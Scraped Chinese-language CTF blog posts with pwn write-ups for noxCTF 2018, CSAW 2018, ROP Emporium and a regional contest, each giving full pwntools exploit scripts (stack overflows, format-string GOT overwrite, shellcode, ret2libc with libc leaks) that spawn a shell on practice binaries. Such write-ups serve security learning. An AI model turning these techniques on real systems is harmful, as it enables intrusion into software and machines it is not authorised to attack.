noxCTF{N3ver_7rust_4h3_F0rmat} PWN—The Name Calculator惯例检查一遍文件 ➜ TheNameCalculator file TheNameCalculator TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped ➜ TheNameCalculator checksec TheNameCalculator [*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 简单过一遍程序，只有一个输入 ➜ TheNameCalculator ./TheNameCalculator What is your name? Ep3ius I‘ve heard better 开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = &#39;a&#39;* (0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825 puts(&quot;What is your name?&quot;); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) { secretFunc(); } 进入secretFunc函数后发现函数最末尾有个格式化字符串漏洞，并且可以通过改exit_got来实现跳转，但中间有一段对输入进行一个异或加密，加密方式很简单就不再赘述，最终要达到的就是输入’aaaa%12$x’能返回未加密时格式化字符串正确的参数就算成功了，剩下的就是普通的格式化字符串改got的标准套路了，不过输入的fmt_payload的大小限制在了27而如果我们直接用fmtstr_payload生成的payload的长度是超过这个大小的，恰巧的是exit_got和superSecretFunc的前两位相同都为0x0804，所以我们的payload就不需要再改exit_got的前两位使我们payload的长度缩减至21 for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; encrypt def encrypt(enc): buf = list(enc) for i in range(0, len(buf) - 4): payload = &#39;&#39;.join(buf[i:i+4]) key = u32(payload)^0x5F7B4153 buf[i:i+4] = list(p32(key)) return &#39;&#39;.join(buf) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;) n = process(&#39;./TheNameCalculator&#39;) #n = remote(&#39;chal.noxale.com&#39;, 5678) elf = ELF(&#39;./TheNameCalculator&#39;) exit_got = elf.got[&#39;exit&#39;] superSecretFunc_addr = 0x08048596 name = &#39;a&#39;*(0x2c-0x10)+p32(0x6A4B825) def encrypt(enc): buf = list(enc) for i in range(0, len(buf) - 4): payload = &#39;&#39;.join(buf[i:i+4]) key = u32(payload)^0x5F7B4153 buf[i:i+4] = list(p32(key)) return &#39;&#39;.join(buf) def check_name(): n.recvuntil(&#39;name?\\n&#39;) n.send(name) def secretFunc(payload): n.recvuntil(&#39;please&#39;) n.send(encrypt(payload)) check_name() payload = fmtstr_payload(12,{exit_got:superSecretFunc_addr},write_size=&#39;short&#39;)[0:21] offset = &#39;aaaa%12$x&#39; secretFunc(payload) n.interactive() FLAG noxCTF{M1nd_7he_Input} CSAW CTFPWN—bigboy简单的bof类型题目，先检查文件 ➜ bigboy file boi boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped ➜ bigboy checksec boi [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) idaF5看一下程序逻辑 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+28h] [rbp-18h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0; HIDWORD(v6) = 0xDEADBEEF; puts(&quot;Are you a big boiiiii??&quot;); read(0, &amp;buf, 24uLL); if ( HIDWORD(v6) == 0xCAF3BAEE ) run_cmd(&quot;/bin/bash&quot;); else run_cmd(&quot;/bin/date&quot;); return 0; } 本以为构造payload = ‘a’* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4 [-------------------------------------code-------------------------------------] 0x40069b &lt;main+90&gt;: mov edi,0x0 0x4006a0 &lt;main+95&gt;: call 0x400500 &lt;read@plt&gt; 0x4006a5 &lt;main+100&gt;: mov eax,DWORD PTR [rbp-0x1c] =&gt; 0x4006a8 &lt;main+103&gt;: cmp eax,0xcaf3baee 0x4006ad &lt;main+108&gt;: jne 0x4006bb &lt;main+122&gt; 0x4006af &lt;main+110&gt;: mov edi,0x40077c 0x4006b4 &lt;main+115&gt;: call 0x400626 &lt;run_cmd&gt; 0x4006b9 &lt;main+120&gt;: jmp 0x4006c5 &lt;main+132&gt; [------------------------------------stack-------------------------------------] 0000| 0x7ffd1313f360 --&gt; 0x7ffd1313f488 --&gt; 0x7ffd131402a8 --&gt; 0x545100696f622f2e (&#39;./boi&#39;) 0008| 0x7ffd1313f368 --&gt; 0x10040072d 0016| 0x7ffd1313f370 (&#39;a&#39; &lt;repeats 16 times&gt;, &quot;\\356\\272\\363\\312\\n\\276\\255&quot;, &lt;incomplete sequence \\336&gt;) 0024| 0x7ffd1313f378 (&quot;aaaaaaaa\\356\\272\\363\\312\\n\\276\\255&quot;, &lt;incomplete sequence \\336&gt;) 0032| 0x7ffd1313f380 --&gt; 0xdeadbe0acaf3baee 0040| 0x7ffd1313f388 --&gt; 0x0 0048| 0x7ffd1313f390 --&gt; 0x7ffd1313f480 --&gt; 0x1 0056| 0x7ffd1313f398 --&gt; 0xcc79c30a8da0b800 [------------------------------------------------------------------------------] blue Legend: code, data, rodata, value 0x00000000004006a8 in main () gdb-peda$ p $eax $1 = 0xdeadbe0a idaF5看不出什么东西，直接切汇编 mov dword ptr [rbp+v6+4], 0DEADBEEFh mov edi, offset s ; &quot;Are you a big boiiiii??&quot; call _puts lea rax, [rbp+buf] mov edx, 18h ; nbytes mov rsi, rax ; buf mov edi, 0 ; fd call _read mov eax, dword ptr [rbp+v6+4] cmp eax, 0CAF3BAEEh jnz short loc_4006BB 这里我们可以很简单就看出原因所在，eax所存的指针指向的是rbp-0x20+4而buf的首地址是指向rbp-0x30,而if语句比较的相当于在0x4006A8时的eax寄存器的值与0xCAF3BAEE是否相等，而两者的差值并非是v6与buf在栈上的距离，而实际的距离应该是0x30-0x20+4 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./boi&#39;) n = remote(&#39;pwn.chal.csaw.io&#39;,9000) payload = &#39;a&#39;*(0x30-0x20+0x4)+p32(0xCAF3BAEE) n.recvuntil(&#39;??&#39;) #gdb.attach(n) n.sendline(payload) n.interactive() FLAG flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} PWN—get it➜ get_it file get_it get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped ➜ get_it checksec get_it [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 程序的逻辑很简单，一个gets溢出，也给了system(‘/bin/sh’)函数，虽然开了NX麻烦直接shellcode来getshell，但ret2text还是很简单的就直接给exp了 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./get_it&#39;) n = remote(&#39;pwn.chal.csaw.io&#39;,9001) give_shell = 0x04005b6 buf = &#39;a&#39;*(32+8) payload = buf + p64(give_shell) n.recvuntil(&#39;it??&#39;) n.sendline(payload) n.interactive() FLAG flag{y0u_deF_get_itls} PWN—shell-&gt;code➜ shellpointcode file shellpointcode shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped ➜ shellpointcode checksec shellpointcode [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的 ➜ shellpointcode ./shellpointcode Linked lists are great! They let you chain pieces of data together. (15 bytes) Text for node 1: aaaa (15 bytes) Text for node 2: bbbb node1: node.next: 0x7ffd53539c70 node.buffer: aaaa What are your initials? 111 Thanks 111 简单分析调试后可以得到栈溢出后8byte后即为返回地址，我们在写完ret地址后接着写入‘/bin/sh’可以达到在开始执行shellcode时rsp里存放的是指向/bin/sh的指针，那么便可以利用mov rdi,rsp使‘/bin/sh\\0’作为execve的参数来调用execve(‘/bin/sh’)来getshell [----------------------------------registers-----------------------------------] RAX: 0x19 RBX: 0x0 RCX: 0x7f1f405832c0 (&lt;__write_nocancel+7&gt;: cmp rax,0xfffffffffffff001) RDX: 0x7f1f40852780 --&gt; 0x0 RSI: 0x7ffea8fdff90 (&quot;Thanks &quot;, &#39;a&#39; &lt;repeats 11 times&gt;, &quot;h&amp;\\376\\250\\376\\177\\n\\nnode.buffer: H\\211\\347j;X1\\366\\231\\017\\005\\n\\n&quot;) RDI: 0x1 RBP: 0x6161616161616161 (&#39;aaaaaaaa&#39;) RSP: 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 RIP: 0x55d7207d08ee (ret) R8 : 0x7f1f40a5e700 (0x00007f1f40a5e700) R9 : 0x19 R10: 0x11 R11: 0x246 R12: 0x55d7207d0720 (xor ebp,ebp) R13: 0x7ffea8fe2770 --&gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x55d7207d08e7: call 0x55d7207d06d0 0x55d7207d08ec: nop 0x55d7207d08ed: leave =&gt; 0x55d7207d08ee: ret 0x55d7207d08ef: push rbp 0x55d7207d08f0: mov rbp,rsp 0x55d7207d08f3: sub rsp,0x40 0x55d7207d08f7: lea rax,[rbp-0x40] [------------------------------------stack-------------------------------------] 0000| 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 0008| 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;) 0016| 0x7ffea8fe2648 --&gt; 0xa (&#39;\\n&#39;) 0024| 0x7ffea8fe2650 --&gt; 0x0 0032| 0x7ffea8fe2658 --&gt; 0x7f1f40851620 --&gt; 0xfbad2887 0040| 0x7ffea8fe2660 --&gt; 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;) 0048| 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 0056| 0x7ffea8fe2670 --&gt; 0xa050f99 [------------------------------------------------------------------------------] blue Legend: code, data, rodata, value 0x000055d7207d08ee in ?? () execve的汇编可以参考http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/ EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./shellpointcode&#39;) #n = remote(&#39;pwn.chal.csaw.io&#39;,9005) shellcode =&quot;&quot;&quot; mov rdi, rsp /* call execve(&#39;rsp&#39;,0,0) rsp-&gt;&#39;/bin/sh\\0&#39; */ push 0x3b /* sys_execve */ pop rax xor esi,esi syscall &quot;&quot;&quot; #print len(asm(shellcode)) #raw_input() n.sendline(asm(shellcode)) sleep(0.1) n.sendline(&#39;&#39;) n.recvuntil(&quot;node.next: &quot;) stack = int(n.recvuntil(&#39;\\n&#39;),16) #gdb.attach(n) node_2 = stack + 0x28 n.sendline(&#39;a&#39;*11 + p64(node_2) + &#39;/bin/sh\\0&#39;) n.interactive() FLAG flag{NONONODE_YOU_WRECKED_BRO}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"ROP_Emporium","slug":"ROP-Emporium","date":"2019-11-05T03:45:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/ROP-Emporium/","link":"","permalink":"/2019/11/05/ROP-Emporium/","excerpt":"","text":"暑假去了趟Xman认识了一群大佬，也因此受到刺激成长了不少，这里就写一篇在xman时通关的ROP—Emporium的wp来记录一下自己的学习历程 ret2win32思路简单的rop构造，ctf-wiki上好像把这种叫做ret2text expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;ret2win32&#39;) elf = ELF(&#39;ret2win32&#39;) bufsize = 40 buf = &#39;a&#39;*bufsize sh_addr = 0x08048659 payload = buf + &#39;aaaa&#39; + p32(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() ret2win思路和上面的方法一样，只有一点差别是在64位下前6个参数是通过寄存器传递，更多的参数才入栈。 expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;ret2win&#39;) elf = ELF(&#39;ret2win&#39;) bufsize = 0x20 buf = &#39;a&#39;*bufsize fake_ebp = &#39;a&#39;*0x8 sh_addr = 0x400811 payload = buf + fake_ebp + p64(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() split32思路热身题，很直接的ret2syscall expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./split32&#39;) elf = ELF(&#39;./split32&#39;) system_addr = elf.plt[&#39;system&#39;] pop_ret = 0x080483e1 sh_addr = 0x804a030 bufsize = 40 buf = &#39;a&#39;*bufsize payload = buf + &#39;aaaa&#39; + p32(system_addr) + &#39;aaaa&#39; + p32(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() split思路64位的ret2syscall,比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如pop rdi;ret的代码片段，从而在执行完pop rdi后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret） expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./split&#39;) elf = ELF(&#39;./split&#39;) bufsize = 32 buf = &#39;a&#39;*bufsize system_addr = elf.plt[&#39;system&#39;] pop_rdi_ret = 0x400883 sh_addr = 0x601060 payload = buf + &#39;a&#39;*8 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() callme32思路ret2libc的简单利用，审计过程序和libccallme32.so不难理解要得到flag要依次调用callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3),这三个函数都是定义在libccallme32里,所以我们可以像调用system去调用(注意堆栈平衡) expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./callme32&#39;) elf = ELF(&#39;./callme32&#39;) callme_one = elf.plt[&#39;callme_one&#39;] callme_two = elf.plt[&#39;callme_two&#39;] callme_three = elf.plt[&#39;callme_three&#39;] ppp_ret = 0x080488a9 bufsize = 0x28 buf = &#39;a&#39;*bufsize argv = p32(1)+p32(2)+p32(3) payload = buf + &#39;aaaa&#39; payload += p32(callme_one)+p32(ppp_ret)+argv payload += p32(callme_two)+p32(ppp_ret)+argv payload += p32(callme_three)+p32(ppp_ret)+argv def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() callme思路和32位差不多，不过不用考虑堆栈平衡(注意64位和32位的差别) expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./callme&#39;) elf = ELF(&#39;./callme&#39;) callme_one = elf.plt[&#39;callme_one&#39;] callme_two = elf.plt[&#39;callme_two&#39;] callme_three = elf.plt[&#39;callme_three&#39;] ppp_ret = 0x401ab0 bufsize = 0x20 buf = &#39;a&#39;*bufsize argv = p64(1) + p64(2) + p64(3) payload = buf + &#39;a&#39;*8 payload += p64(ppp_ret) + argv + p64(callme_one) payload += p64(ppp_ret) + argv + p64(callme_two) payload += p64(ppp_ret) + argv + p64(callme_three) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() write432思路exp","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"铁三福建赛区pwn回顾","slug":"铁三福建赛区pwn回顾","date":"2019-11-05T03:44:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/铁三福建赛区pwn回顾/","link":"","permalink":"/2019/11/05/铁三福建赛区pwn回顾/","excerpt":"","text":"建了新博客开始还是写点东西存着，不然空空的感觉也不是很好，刚好看到文涛学长给我的铁三PWN题，当时我连涛神写的exp都看不懂，现在看看自己当初真的太菜了，所以现在重新看一遍题目来检验现在的实力 ROP思路简单看了一遍程序，vuln函数明显的栈溢出，利用空间贼大，checksec检测下只开了NX，直接ret2libc做ROP来getshell expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./rop&#39;) elf = ELF(&#39;./rop&#39;) libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;) #libc = ELF(&#39;./libc32&#39;) buf = &#39;a&#39;*0x88 vuln_addr = 0x08048474 write_got = elf.got[&#39;write&#39;] write_plt = elf.plt[&#39;write&#39;] write_sym = libc.symbols[&#39;write&#39;] bin_sh = libc.search(&#39;/bin/sh&#39;).next() system_sym = libc.symbols[&#39;system&#39;] leak = buf+&#39;aaaa&#39;+ p32(write_plt) +p32(vuln_addr)+ p32(1) + p32(write_got) + p32(0x4) n.sendline(leak) write_addr = u32(n.recv()) print hex(write_addr) libc_base = write_addr - write_sym system_addr = libc_base + system_sym #one_gadget = 0x3a80c one_gadget = 0x3ac5c + libc_base payload = buf+ &#39;aaaa&#39; + p32(one_gadget) n.sendline(payload) n.interactive() breakfast思路简单的审一遍代码发现 write正常应该是输出ptr[idx]，这里很突兀的就输出了ptr[idx]所指向地址的内容，所以往ptr[idx]里写入write的got地址来获得实际地址来计算libc_base","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]}]}